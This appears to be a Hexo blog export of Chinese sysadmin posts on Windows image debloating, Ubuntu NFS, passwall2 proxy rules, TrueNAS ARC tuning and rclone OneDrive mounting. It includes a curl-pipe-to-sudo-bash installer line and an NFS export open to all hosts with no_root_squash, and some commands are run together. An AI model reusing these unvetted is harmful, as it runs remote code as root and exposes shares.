<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Clipchamp.Clipchamp 2.2.8.0 neutral ~ yxz26nhyzhsrt --Windows11自带剪辑软件Clipchamp</span><br><span class="line">Microsoft.549981C3F5F10 3.2204.14815.0 neutral ~ 8wekyb3d8bbwe --微软私人助理Cortana（小娜）</span><br><span class="line">Microsoft.BingNews 4.2.27001.0 neutral~ 8wekyb3d8bbwe --Bing新闻资讯</span><br><span class="line">Microsoft.BingWeather 4.53.334200 neutral ~ 8wekyb3d8bbwe--Bing天气</span><br><span class="line">Microsoft.DesktopApplnstaller 2022.310.2333.0 neutral ~ 8wekyb3d8bbwe --UWP软件安装程序</span><br><span class="line">Microsoft.GamingApp 2021.427.138.0 neutral ~ 8wekyb3d8bbwe --xbox游戏服务</span><br><span class="line">Microsoft.GetHelp 10.2201.421.0 neutral ~ 8wekyb3d8bbwe --获取帮助</span><br><span class="line">Microsoft.Getstarted 2021.2204.1.0 neutral ~ 8wekyb3d8bbwe --系统使用技巧</span><br><span class="line">Microsoft.HEIFImageExtension 1.043012.0 x64 8wekyb3d8bbwe --系统内置图片格式查看器</span><br><span class="line">Microsoft.HEVCVideoExtension 1.0.50361.0 x64 8wekyb3d8bbwe --HEVC视频编解码器</span><br><span class="line">Microsoft.MicrosoftOfficeHub 18.2204.1141.0 neutral ~ 8wekyb3d8bbwe --office网页版</span><br><span class="line">Microsoft.MicrosoftSolitaireCollection 4.12.3171.0 neutral ~ 8wekyb3d8bbwe --扑克游戏</span><br><span class="line">Microsoft.MicrosoftStickyNotes 4.2.2.0 neutral ~ 8wekyb3d8bbwe --便签</span><br><span class="line">Microsoft.Paint 11.2201.22.0 neutral ~ 8wekyb3d8bbwe --画图工具</span><br><span class="line">Microsoft.People 2020.901.1724.0 neutral ~ 8wekyb3d8bbwe --人脉</span><br><span class="line">Microsoft.PowerAutomateDesktop 10.0.3735.0 neutral ~ 8wekyb3d8bbwe --流程自动化软件</span><br><span class="line">Microsoft.RawlmageExtension 2.1.30391.0 neutral ~ 8wekyb3d8bbwe --RAW图像扩展</span><br><span class="line">Microsoft.ScreenSketch 2022.2201.12.0 neutral ~ 8wekyb3d8bbwe --截图和草图</span><br><span class="line">Microsoft.SecHealthUl_1000.22621.1.0 x64 8wekyb3d8bbwe --系统安全组件（不建议删除）</span><br><span class="line">Microsoft.StorePurchaseApp_12008.1001.113.0_neutral_~_8wekyb3d8bbwe --微软商店核心组件</span><br><span class="line">Microsoft.Todos_2.54.42772.0_neutral_~_8wekyb3d8bbwe --Todo待办清单软件</span><br><span class="line">Microsoft.VCLibs.140.00 14.0.30704.0_x64 8wekyb3d8bbwe --微软商店组件</span><br><span class="line">Microsoft.vp9VideoExtensions 1.0.50901.0 x64 8wekyb3d8bbwe --VP9视频扩展</span><br><span class="line">Microsoft.WebMediaExtensions 1.0.42192.0 neutral ~ 8wekyb3d8bbwe --Web媒体扩展</span><br><span class="line">Microsoft.WebplmageExtension 1.0.42351.0 x64 8wekyb3d8bbwe --webp图片扩展功</span><br><span class="line">Microsoft.Windows.Photos 21.21030.25003.0 neutral ~ 8wekyb3d8bbwe --照片查看器</span><br><span class="line">Microsoft.WindowsAlarms 2022.2202.24.0 neutral ~ 8wekyb3d8bbwe --闹钟</span><br><span class="line">Microsoft.WindowsCalculator 2020.2103.8.0 neutral ~ 8wekyb3d8bbwe --计算器</span><br><span class="line">Microsoft.WindowsCamera 2022.2201.4.0 neutral ~ 8wekyb3d8bbwe --相机</span><br><span class="line">microsoft.windowscommunicationsapps _16005.14326.20544.0 neutral ~ 8wekyb3d8bbwe --日历</span><br><span class="line">Microsoft.WindowsFeedbackHub 2022106.2230.0 neutral ~ 8wekyb3d8bbwe --反馈中心</span><br><span class="line">Microsoft.WindowsMaps 2022.2202.6.0 neutral ~ 8wekyb3d8bbwe --Windows地图</span><br><span class="line">Microsoft.WindowsNotepad 11.2112.32.0 neutral  8wekyb3d8bbwe --记事本</span><br><span class="line">Microsoft.WindowsSoundRecorder 2021.2103.28.0_neutral_~ 8wekyb3d8bbwe --录音</span><br><span class="line">Microsoft.WindowsStore 22204.1400.4.0 neutral ~ 8wekyb3d8bbwe --微软商店</span><br><span class="line">Microsoft.WindowsTerminal 300112.10983.0 neutral  8wekyb3d8bbwe --Windows终端</span><br><span class="line">Microsoft.XboxTCUl 1.23.28004.0 neutral ~ 8wekyb3d8bbwe --Xbox游戏组件</span><br><span class="line">Microsoft.XboxGameOverlay_1.47.2385.0 neutral~8wekyb3d8bbwe --Xbox游戏组件</span><br><span class="line">Microsoft.XboxGamingOverlay_2.622.3232.0_neutral ~ 8wekyb3d8bbwe --Xbox游戏组件</span><br><span class="line">Microsoft.XboxldentityProvider 12.50.6001.0 neutral ~8wekyb3d8bbwe --Xbox游戏组件</span><br><span class="line">Microsoft.XboxSpeechToTextOverlay_1.17.29001.0 neutral ~ 8wekyb3d8bbwe --Xbox游戏组件</span><br><span class="line">Microsoft.YourPhone 1.22022147.0 neutral ~ 8wekyb3d8bbwe --你的手机</span><br><span class="line">Microsoft.ZuneMusic 11.2202.46.0 neutral ~ 8wekyb3d8bbwe --媒体播放器</span><br><span class="line">Microsoft.ZuneVideo 2019.22020.10021.0 neutral ~ 8wekyb3d8bbwe --电影和电视</span><br><span class="line">Microsoft.Corporationll.QuickAssist 2022.414.1758.0 neutral ~ 8wekyb3d8bbwe --快速助手</span><br><span class="line">MicrosoftWindows.Client.WebExperience 421.20070.195.0 neutral ~cw5n1h2txyewy  --小组件</span><br></pre></td></tr></table></figure>

<p>第四步 添加硬件驱动</p>
<p>一些外置设备，每次装完系统，还需要重新安装驱动，我们可以利用Dism进行驱动注入，这样就免去每次安装驱动了。Dism主界面，点击控制面板下的驱动管理，右侧窗口点击添加驱动，路径选择，选中解压好的驱动，一般都是在Drivers文件下，这里需要注意下，现在的驱动都是一键安装程序，我们要给它解压，才能正常注入，成功添加打印机驱动后，我们可在窗口看见打印机设备。</p>
<p>第五步 对镜像系统进行优化</p>
<p>每次重装完系统后，桌面图标都不会显示，还需要我们手动设置，通过系统优化，可以让该系统镜像安装后，默认显示桌面图标。Dism主界面，点击控制面板下系统优化，右侧展开桌面图标管理，在桌面显示我的电脑选项，右侧下拉选中显示，依次对其他图标进行相同设置！系统优化里的功能很冗杂，你们可以根据自己的需要进行设置，譬如任务栏、资源管理器，以及安全相关设置等等！如果你想深度精简，还可以针对程序和功能里的Windows功能，进行删减操作，可以很大程度上，减少镜像体积，操作方法也很简单，只要给想删掉的功能，勾选上×，最后点击应用即可！</p>
<p>第六步 压缩转换WIM安装映像</p>
<p>当你针对映像所有操作都完成后，Dism主界面，点击文件-保存映像，弹出对话框选择直接保存，映像保存好后，点击文件-卸载映像，过程可能有点长，耐心等待！映像卸载完成后，第二步的映像挂载文件夹会被清空，我们直接删除这个空文件夹即可！回到Dism主界面，选中挂载的当前系统，点击常用工具下的工具箱，单击WIM、ESD互转，源文件选择我们提取并修改的WIM映像文件，目标文件，点击浏览会弹出保存位置，路径随意，你找到了就行，保存类型下拉，选择点ESP，文件名输入install，最后点击保存，开始压缩转换映像，耐心等待完成！</p>
<p>第七步 打包ISO系统镜像</p>
<p>系统安装映像压缩转换完成后，会在你选择的路径，生成一个install.esd的文件，我们复制该文件，到第一步解压主目录sources文件夹里，并把原有的install.wim文件删除，此操作就是利用我们修改好的安装文件，替换原版系统里的安装文件，有宝子会有疑问，这个文件的后缀不一样，没问题的，都是微软的镜像格式文件，安装程序都会识别，只不过ESD比WIM格式压缩比要高很多，从而节省存储空间！回到Dism工具箱界面，点击ISO生成器，文件夹路径，选择我们第一步解压的文件夹，ISO生成路径随意，还是你找到了就行，标签就是这个镜像的名字，可以随意填写！最后点击确定，开始打包ISO镜像，过程依旧有点长，耐心的等！</p>
<p>ISO镜像打包好后，你就可以测试安装了，建议先在虚拟机环境测试，没问题了，再在物理机上安装使用！</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu开启nfs服务</title>
    <url>/posts/9c9e9b73/</url>
    <content><![CDATA[<p>在Ubuntu上设置NFS（网络文件系统）服务，可以让你在不同的计算机之间共享文件和目录。下面是如何在Ubuntu上设置NFS服务的基本步骤：</p>
<h3 id="步骤-1-安装NFS服务器"><a href="#步骤-1-安装NFS服务器" class="headerlink" title="步骤 1: 安装NFS服务器"></a>步骤 1: 安装NFS服务器</h3><p>首先，你需要安装NFS服务器。打开终端并运行以下命令来安装NFS服务器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install nfs-kernel-server</span><br></pre></td></tr></table></figure>

<h3 id="步骤-2-配置NFS导出"><a href="#步骤-2-配置NFS导出" class="headerlink" title="步骤 2: 配置NFS导出"></a>步骤 2: 配置NFS导出</h3><p>安装完NFS服务器后，你需要配置哪些目录将被共享。编辑<code>/etc/exports</code>文件来添加或修改共享目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/exports</span><br></pre></td></tr></table></figure>

<p>在文件中添加一行来指定要共享的目录及其访问权限。例如，要共享<code>/srv/nfs</code>目录给所有网络上的客户端，可以这样设置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/srv/nfs *(rw,<span class="built_in">sync</span>,no_subtree_check,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>这里，<code>rw</code>表示读写权限，<code>sync</code>表示数据同步写入硬盘，<code>no_subtree_check</code>可以加快访问速度，但可能会在删除深层目录时出现问题。根据你的需求调整这些选项。</p>
<h3 id="步骤-3-导出目录（可选）"><a href="#步骤-3-导出目录（可选）" class="headerlink" title="步骤 3: 导出目录（可选）"></a>步骤 3: 导出目录（可选）</h3><p>修改完<code>/etc/exports</code>文件后，你需要使更改生效。运行以下命令来导出配置的目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exportfs -a</span><br></pre></td></tr></table></figure>

<h3 id="步骤-4-重启NFS服务"><a href="#步骤-4-重启NFS服务" class="headerlink" title="步骤 4: 重启NFS服务"></a>步骤 4: 重启NFS服务</h3><p>为了使更改生效，重启NFS服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart nfs-kernel-server</span><br></pre></td></tr></table></figure>

<h3 id="步骤-5-设置防火墙规则（如果使用UFW）"><a href="#步骤-5-设置防火墙规则（如果使用UFW）" class="headerlink" title="步骤 5: 设置防火墙规则（如果使用UFW）"></a>步骤 5: 设置防火墙规则（如果使用UFW）</h3><p>如果你使用的是UFW防火墙，需要允许NFS相关的端口通过防火墙：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ufw allow from any to any port 2049sudo ufw reload</span><br></pre></td></tr></table></figure>

<h3 id="步骤-6-在客户端挂载NFS共享"><a href="#步骤-6-在客户端挂载NFS共享" class="headerlink" title="步骤 6: 在客户端挂载NFS共享"></a>步骤 6: 在客户端挂载NFS共享</h3><p>在客户端计算机上，你可以使用以下命令来挂载NFS共享：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /mnt/nfs_sharesudo mount -t nfs [服务器IP地址]:/srv/nfs /mnt/nfs_share</span><br></pre></td></tr></table></figure>

<p>确保替换<code>[服务器IP地址]</code>为你的Ubuntu服务器IP地址。</p>
<h3 id="步骤-7-自动挂载（可选）"><a href="#步骤-7-自动挂载（可选）" class="headerlink" title="步骤 7: 自动挂载（可选）"></a>步骤 7: 自动挂载（可选）</h3><p>要使挂载在系统启动时自动进行，你可以编辑<code>/etc/fstab</code>文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/fstab</span><br></pre></td></tr></table></figure>

<p>添加一行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[服务器IP地址]:/srv/nfs /mnt/nfs_share nfs defaults 0 0</span><br></pre></td></tr></table></figure>

<p>保存并关闭文件后，NFS共享将在系统启动时自动挂载。</p>
<p>以上就是在Ubuntu上设置NFS服务的基本步骤。通过这些步骤，你可以轻松地在Ubuntu服务器和客户端之间共享文件和目录。</p>
<h3 id="解决WINDOWS挂载NFS后文件中文名显示乱码问题"><a href="#解决WINDOWS挂载NFS后文件中文名显示乱码问题" class="headerlink" title="解决WINDOWS挂载NFS后文件中文名显示乱码问题"></a>解决WINDOWS挂载NFS后文件中文名显示乱码问题</h3><p>Window挂载NFS后，文件夹中的中文文件名会显示乱码，主要原因是微软NFS协议不支持UTF-8的问题，导致文件乱码，NAS中文件管理器显示正常。</p>
<p>目前WIN10中已含有一个Beta设置，支持全局 UTF-8，修改后即可正常显示，按下Win+R，输入 intl.cpl，点击确定<br>切换tab 进入管理中</p>
<p>区域和时间切换tab<br>点击更改系统区域设置</p>
<p>勾选Beta版，点击确定，选择重启后，相应的文件名即可显示正常。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>passwall2完美配置</title>
    <url>/posts/9fc528b9/</url>
    <content><![CDATA[<blockquote>
<p>前言：<br>1、小猫咪插件使用Meta内核+FakeIP模式，不需要套任何插件就能够解决DNS污染、DNS泄露问题及去广告，但是跟IPv6的兼容性存在问题，因此比较适合在纯IPv4下使用。<br>2、ssrPlus+插件需要搭配MosDNS来解决DNS泄露、IPv4&#x2F;IPv6双栈共存等问题<br>那有没有集合上述所有优点、规避缺点的插件呢？</p>
<p>今天就来聊聊几乎完美的：Pass Wall2</p>
<p>Pass Wall2能够给我们带来什么的体验？<br>1、解决DNS泄露<br>2、IPv4&#x2F;IPv6双栈共存<br>3、IPv6连接zerotier进行全隧道上网海淘<br>4、去广告</p>
</blockquote>
<h1 id="一、规则管理"><a href="#一、规则管理" class="headerlink" title="一、规则管理"></a>一、规则管理</h1><p>删除默认的所有规则，然后添加Reject规则、Direct规则、Proxy规则</p>
<h2 id="Reject规则填入域名："><a href="#Reject规则填入域名：" class="headerlink" title="Reject规则填入域名："></a>Reject规则填入域名：</h2><p><code>geosite:category-ads-all</code></p>
<h2 id="Direct规则填入："><a href="#Direct规则填入：" class="headerlink" title="Direct规则填入："></a>Direct规则填入：</h2><p><strong>域名：</strong></p>
<p><code>xn--ngstr-lra8j.com</code><br><code>geosite:private</code><br><code>geosite:cn</code><br><strong>IP：</strong><br><code>geoip:private</code><br><code>geoip:cn</code></p>
<h2 id="Proxy规则填入："><a href="#Proxy规则填入：" class="headerlink" title="Proxy规则填入："></a>Proxy规则填入：</h2><p><code>geosite:geolocation-!cn</code></p>
<p>规则的顺序一定要这样排列：</p>
<p>1、Reject规则</p>
<p>2、Direct规则</p>
<p>3、Proxy规则</p>
<blockquote>
<p><strong>注释：</strong><br>geosite:category-ads-all 去广告<br>xn–ngstr-lra8j.com           谷歌商店<br>geosite:private               内网地址<br>geosite:cn                   国内域名</p>
<p>geoip:private                内网IP<br>geoip:cn                    国内IP<br>geosite:geolocation-!cn      国外域名</p>
</blockquote>
<h1 id="二、高级设置"><a href="#二、高级设置" class="headerlink" title="二、高级设置"></a>二、高级设置</h1><p>1.如果不使用UDP代理，就把UDP不转发端口改成-所有，即可</p>
<p>2.设置TCP转发端口为：仅网页 ，也就是仅允许代理80、443这两个端口</p>
<p>3.TCP代理方式可以改成TPROXY，也可以默认REDIRECT（勾选IPv6透明代理(TProxy)后，会自动变更为TPROXY）</p>
<p>4.如果你的节点支持IPv4&#x2F;IPv6互通或者有IPv6的出口IP，可以勾选IPv6透明代理(TProxy)，反之不勾选</p>
<h1 id="三、修改节点配置Xray分流：-分流总节点"><a href="#三、修改节点配置Xray分流：-分流总节点" class="headerlink" title="三、修改节点配置Xray分流：[分流总节点]"></a>三、修改节点配置Xray分流：[分流总节点]</h1><p>1.Reject设置为：黑洞（丢弃）</p>
<p>2.Direct设置为：直连（绕过）</p>
<p>3.Proxy设置为：默认（代理）</p>
<p>3.*默认设置为：按照自己需求选择一个作为上网海淘的节点</p>
<p>4.域名解析策略设置为：AsIs （也就是跳过IP匹配、只匹配域名）</p>
<h1 id="四、基本设置"><a href="#四、基本设置" class="headerlink" title="四、基本设置"></a>四、基本设置</h1><p>1.远程 DNS 协议：DOH</p>
<p>2.勾选FakeDNS</p>
<p>注释：</p>
<p>1、远程DNS出站一定要设置为：远程（走代理），不然你走直连大概率是不通的，但是DOH走代理都是会增加延迟</p>
<p>2、勾选FakeDNS后，在Proxy规则内的域名，匹配上的会返回一个假IP作为DNS响应（例如198.18.0.0&#x2F;16），最后将域名请求发送给节点服务器VPS在它的网络环境中进行解析IP</p>
<p>3、不在Proxy规则内的域名则会使用设置的CloudFlare远程DNS进行本地DNS解析真实IP，最后将这个真实IP发送给节点服务器VPS，而如果遇到解析出的是被污染的IP，由于开启了嗅探功能，会探测HTTP请求里的域名，所以就算本地解析出的IP是被污染也不影响</p>
<p>4、如何判断是走FakeDNS还是走远程DNS，电脑运行CMD窗口，输入nslookup youtube.com回车，输入nslookup ipleak.net回车</p>
<p>3.主要—节点设置为：Xray分流：[分流总节点]</p>
<p>4.以上都配置好之后，勾选上主开关保存应用即可</p>
<p>注意：图上的 *默认 选项处并非是留空，是要填一个节点的</p>
<p><strong>上述都配置完成后，就能够解决DNS泄露、污染问题和去广告，并且支持双栈IPv4&#x2F;IPv6上网，不需要再去套任何插件和关闭或禁止解析 IPv6 DNS 记录等。</strong></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>proxy</tag>
        <tag>passwall2</tag>
      </tags>
  </entry>
  <entry>
    <title>truenas scale的arc配置</title>
    <url>/posts/d265d6c7/</url>
    <content><![CDATA[<h1 id="调整默认的-arc内存占用规则"><a href="#调整默认的-arc内存占用规则" class="headerlink" title="调整默认的 arc内存占用规则"></a>调整默认的 arc内存占用规则</h1><blockquote>
<p>根据ZFS的配置文档，系统通过zfs_arc_max来控制用做缓存的内存使用量。zfs_arc_max的默认值是0，代表50%。此外，还有一个zfs_arc_sys_free的参数，用于控制系统的空余内存上限，默认也是0。</p>
</blockquote>
<h2 id="调整配置"><a href="#调整配置" class="headerlink" title="调整配置"></a>调整配置</h2><blockquote>
<p>因此，我们要调整内存占用规则，就需要修改上述相关参数</p>
</blockquote>
<ul>
<li><p>进入 <code>设置(System Settings）</code>– &gt; <code>高级(Advanced)</code> 里找到 <code>Init/Shutdown Script</code></p>
</li>
<li><p>添加脚本 <code>echo SIZE_IN_BYTES &gt;&gt; /sys/module/zfs/parameters/zfs_arc_max</code>其中 SIZE_IN_BYTES换成你想要的数值，例如 <code>2GB</code> 的话，填 <code>2147483648</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2147483648 &gt;&gt; /sys/module/zfs/parameters/zfs_arc_max</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>ps任何pcie的直通都会导致pve无法使用内存ballooning技术,会让虚拟机在一开始就分配所有需要的内存,所以pve下的truenas不推荐直通pcie设备</p>
</blockquote>
<p><a href="https://openzfs.github.io/openzfs-docs/Performance%20and%20Tuning/Module%20Parameters.html#zfs-arc-sys-free">zfs-doc</a><br>上面的链接又详细的zfs的参数说明</p>
<h1 id="不影响zfs使用的最大的内存但是又要在使用完后积极的释放"><a href="#不影响zfs使用的最大的内存但是又要在使用完后积极的释放" class="headerlink" title="不影响zfs使用的最大的内存但是又要在使用完后积极的释放"></a>不影响zfs使用的最大的内存但是又要在使用完后积极的释放</h1><p>需要修改的参数的有以下这几个</p>
<p><code>zfs_arc_eviction_pct</code><br><code>zfs_arc_shrink_shift</code><br><code>zfs_arc_sys_free</code></p>
<h2 id="zfs-arc-eviction-pct"><a href="#zfs-arc-eviction-pct" class="headerlink" title="zfs_arc_eviction_pct"></a>zfs_arc_eviction_pct</h2><p>zfs_arc_eviction_pct 的默认值为 200%，表示在内存不足时，为每 2KB 释放内存，1KB 可被重新分配使用。增大该值（如 300%-400%）将加快 ARC 在高负载后的释放速度。此设置会增加 ARC<br>清理时释放的内存总量，从而有效释放更多的内存TrueNAS Open Enterprise Storage<br>50% ARC 每次收缩当前大小的 50%，即一半。<br>25%<br>12.5%<br>6.25%<br>3.125%<br>1.5625%<br>0.78125%<br>将 zfs_arc_eviction_pct 设置为 300 或 400，确保在密集 IO 操作后有更快速的缓存释放。</p>
<h2 id="zfs-arc-shrink-shift"><a href="#zfs-arc-shrink-shift" class="headerlink" title="zfs_arc_shrink_shift"></a>zfs_arc_shrink_shift</h2><p>zfs_arc_shrink_shift 默认值为 7，意味着在内存紧张时，ARC 缩减速率约为 0.8%。降低该值（如设为 4-5）会更激进地减少 ARC 缓存的大小，适合在内存频繁短缺时使用<br>设置 zfs_arc_shrink_shift 为 4 或 5，以实现较为激进的内存释放，确保在高负载后更快腾出内存。</p>
<h2 id="zfs-arc-sys-free"><a href="#zfs-arc-sys-free" class="headerlink" title="zfs_arc_sys_free"></a>zfs_arc_sys_free</h2><p>zfs_arc_sys_free 此参数决定系统应该保留多少空闲内存。默认为系统物理内存的 1&#x2F;64 或 512KB，适当增大该值可以让 ARC 更积极地释放缓存，保证系统有更充足的可用内存( TrueNAS Open Enterprise<br>Storage<br>如果有 14GB 总内存，可以设置 zfs_arc_sys_free 为<br>268435456（256MB）或更大，这样可以在高内存需求时保留较多的空闲内存，防止 ARC 占用过多</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 300 &gt;&gt; /sys/module/zfs/parameters/zfs_arc_eviction_pct</span><br><span class="line"><span class="built_in">echo</span> 4 &gt;&gt; /sys/module/zfs/parameters/zfs_arc_shrink_shift</span><br><span class="line"><span class="built_in">echo</span> 1073741824 &gt;&gt; /sys/module/zfs/parameters/zfs_arc_sys_free</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>truenasscale</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>nas</tag>
        <tag>truenasscale</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器用rclone挂载onedrive定时远程备份</title>
    <url>/posts/20d174c8/</url>
    <content><![CDATA[<h1 id="一、安装-rclone"><a href="#一、安装-rclone" class="headerlink" title="一、安装 rclone"></a>一、安装 rclone</h1><p>使用脚本下载安装 Rclone：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://rclone.org/install.sh | sudo bash</span><br></pre></td></tr></table></figure>

<p>1.在 rclone 中配置 OneDrive</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rclone config</span><br></pre></td></tr></table></figure>

<p>输入 n 创建一个新配置</p>
<p>然后填一个名称，例如onedrive，会要求选择要挂载的网盘，找到 Microsoft OneDrive 并输入其前面的序号，接下来会要求输入 client_id 和 client_secret。然后会出现 OneDrive 区域选择，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Choose national cloud region <span class="keyword">for</span> OneDrive.</span><br><span class="line">Enter a string value. Press Enter <span class="keyword">for</span> the default (<span class="string">&quot;global&quot;</span>).</span><br><span class="line">Choose a number from below, or <span class="built_in">type</span> <span class="keyword">in</span> your own value</span><br><span class="line"> 1 / Microsoft Cloud Global</span><br><span class="line">   \ <span class="string">&quot;global&quot;</span></span><br><span class="line"> 2 / Microsoft Cloud <span class="keyword">for</span> US Government</span><br><span class="line">   \ <span class="string">&quot;us&quot;</span></span><br><span class="line"> 3 / Microsoft Cloud Germany</span><br><span class="line">   \ <span class="string">&quot;de&quot;</span></span><br><span class="line"> 4 / Azure and Office 365 operated by 21Vianet <span class="keyword">in</span> China</span><br><span class="line">   \ <span class="string">&quot;cn&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以直接输入 1 选择全球</p>
<p>然后是选择是否进行高级配置，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dit advanced config? (y/n)</span><br><span class="line">y) Yes</span><br><span class="line">n) No (default)</span><br></pre></td></tr></table></figure>

<p>可以输入 n ，</p>
<p>接着是自动配置选择，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Remote config</span><br><span class="line">Use auto config?</span><br><span class="line"> * Say Y <span class="keyword">if</span> not sure</span><br><span class="line"> * Say N <span class="keyword">if</span> you are working on a remote or headless machine</span><br><span class="line">y) Yes (default)</span><br><span class="line">n) No</span><br></pre></td></tr></table></figure>

<p>可以输入 n ，</p>
<p>这里需要获取授权码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">For this to work, you will need rclone available on a machine that has</span><br><span class="line">a web browser available.</span><br><span class="line"></span><br><span class="line">For more <span class="built_in">help</span> and alternate methods see: https://rclone.org/remote_setup/</span><br><span class="line"></span><br><span class="line">Execute the following on the machine with the web browser (same rclone</span><br><span class="line">version recommended):</span><br><span class="line"></span><br><span class="line">    rclone authorize <span class="string">&quot;onedrive&quot;</span></span><br><span class="line"></span><br><span class="line">Then <span class="built_in">paste</span> the result below:</span><br></pre></td></tr></table></figure>

<p>授权码需要在本地电脑上获取，访问 <a href="https://rclone.org/downloads/">rclone</a> 根据你的电脑系统版本下载对应的 Rclone。</p>
<p>下载完成后解压，进入存放 Rclone 的目录，打开 Powershell ，Rclone 放在 D:\下载\rclone-v1.67.0-windows-amd64 ，输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:\下载\rclone-v1.67.0-windows-amd64</span><br></pre></td></tr></table></figure>

<p>在存放 Rclone 的目录可以看到 rclone.exe 的可执行程序，输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./rclone authorize <span class="string">&quot;onedrive&quot;</span></span><br></pre></td></tr></table></figure>

<p>浏览器应该会自动打开，如果浏览器没有打开可以根据提示复制地址访问。如果浏览器登录了 OneDrive 的话会直接显示授权确认信息，如果没有登录的话会弹出登录页面，登录 OneDrive 后也会显示授权确认信息。</p>
<p>选择 接受 后在本地命令行会显示一串 JSON 格式的授权信息，复制授权信息包括首尾的 {} ，到 Linux 终端粘贴。</p>
<p>然后是选择 OneDrive 的类型，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Choose a number from below, or <span class="built_in">type</span> <span class="keyword">in</span> an existing value</span><br><span class="line"> 1 / OneDrive Personal or Business</span><br><span class="line">   \ <span class="string">&quot;onedrive&quot;</span></span><br><span class="line"> 2 / Root Sharepoint site</span><br><span class="line">   \ <span class="string">&quot;sharepoint&quot;</span></span><br><span class="line"> 3 / Sharepoint site name or URL (e.g. mysite or https://contoso.sharepoint.com/sites/mysite)</span><br><span class="line">   \ <span class="string">&quot;url&quot;</span></span><br><span class="line"> 4 / Search <span class="keyword">for</span> a Sharepoint site</span><br><span class="line">   \ <span class="string">&quot;search&quot;</span></span><br><span class="line"> 5 / Type <span class="keyword">in</span> driveID (advanced)</span><br><span class="line">   \ <span class="string">&quot;driveid&quot;</span></span><br><span class="line"> 6 / Type <span class="keyword">in</span> SiteID (advanced)</span><br><span class="line">   \ <span class="string">&quot;siteid&quot;</span></span><br><span class="line"> 7 / Sharepoint server-relative path (advanced, e.g. /teams/hr)</span><br><span class="line">   \ <span class="string">&quot;path&quot;</span></span><br></pre></td></tr></table></figure>

<p>输入 1</p>
<p>然后会显示找到的 OneDrive 账户，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Found 1 drives, please <span class="keyword">select</span> the one you want to use:</span><br><span class="line">0: OneDrive (business) <span class="built_in">id</span>=</span><br></pre></td></tr></table></figure>

<p>根据提示输入序号，</p>
<p>这里会根据你输入的序号查找账户，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Found drive <span class="string">&#x27;root&#x27;</span> of <span class="built_in">type</span> <span class="string">&#x27;business&#x27;</span>, URL: https://xxx-my.sharepoint.com/personal/changbin_xxx_onmicrosoft_com/Documents</span><br><span class="line">Is that okay?</span><br><span class="line">y) Yes (default)</span><br><span class="line">n) No</span><br></pre></td></tr></table></figure>

<p>确认无误后输入 y ，</p>
<p>接着会显示你选择的配置信息，确认无误后输入 y 保存配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Current remotes:</span><br><span class="line">Name                 Type</span><br><span class="line">====                 ====</span><br><span class="line">onedrive                onedrive</span><br><span class="line">e) Edit existing remote</span><br><span class="line">n) New remote</span><br><span class="line">d) Delete remote</span><br><span class="line">r) Rename remote</span><br><span class="line">c) Copy remote</span><br><span class="line">s) Set configuration password</span><br><span class="line">q) Quit config</span><br><span class="line">e/n/d/r/c/s/q&gt; q</span><br></pre></td></tr></table></figure>

<p>经过上面的设置后，我们就成功地将Rclone连接挂载到OneDrive网盘啦。</p>
<h1 id="二、挂载到-vps"><a href="#二、挂载到-vps" class="headerlink" title="二、挂载到 vps"></a>二、挂载到 vps</h1><p>首先新建一个文件夹用于挂载：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /onedrive</span><br></pre></td></tr></table></figure>

<p>开始挂载：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rclone mount onedrive: /onedrive --allow-other --allow-non-empty --vfs-cache-mode writes --daemon</span><br></pre></td></tr></table></figure>

<p>其中 onedrive 是 rclone 配置时输入的配置名称，&#x2F;onedrive 是挂载目录，–daemon 是指后台运行。</p>
